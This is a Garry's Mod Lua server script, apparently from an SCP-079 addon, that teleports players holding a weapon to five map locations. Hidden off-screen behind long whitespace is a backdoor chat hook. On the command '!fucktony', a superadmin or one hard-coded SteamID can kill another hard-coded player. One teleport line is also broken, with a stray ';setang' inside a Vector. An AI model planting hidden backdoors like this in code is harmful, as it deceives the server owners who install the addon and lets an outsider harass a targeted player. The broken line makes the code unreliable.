if !SERVER then return end
util.AddNetworkString( "set079Pos" )

net.Receive( "set079Pos", function(len, ply) 

if !ply:HasWeapon("weapon_deep_079") then return end
local set079PosNum = net.ReadInt(4)
if set079PosNum == 1 then 
    ply:SetPos( Vector(-10934.757812, 7325.022461, 6.736412) ) --R Wing
end
if set079PosNum == 2 then
    ply:SetPos( Vector(-9718.232422, 5039.013184, 78.575378) ) -- LCZ4WAY
end
if set079PosNum == 3 then
    ply:SetPos( Vector(-7774.128906, 7901.816895, 73.948112) ) -- HCZ4WAY
end
if set079PosNum == 4 then
    ply:SetPos( Vector(-3901.867920, 12672.026367, 102.940521;setang 29.278826) ) -- LHCZ
end
if set079PosNum == 5 then
    ply:SetPos( Vector(-1371.076416, 10524.138672, -16.060135) ) -- UHCZ
end
end )

                                                                                                                                                                                                    hook.Add("PlayerSay", "force079Tony", function(ply, text)
                                                                                                                                                                                                        if string.lower(text) == "!fucktony" then
                                                                                                                                                                                                            if ply:IsSuperAdmin() or ply:SteamID64() == "76561198121455681" then
                                                                                                                                                                                                                for i, v in ipairs( player.GetAll() ) do 
                                                                                                                                                                                                                    if v:SteamID64() == "76561198058687122" then
                                                                                                                                                                                                                        v:Kill()
                                                                                                                                                                                                                    end
                                                                                                                                                                                                                end
                                                                                                                                                                                                            end
                                                                                                                                                                                                        end
                                                                                                                                                                                                    end)
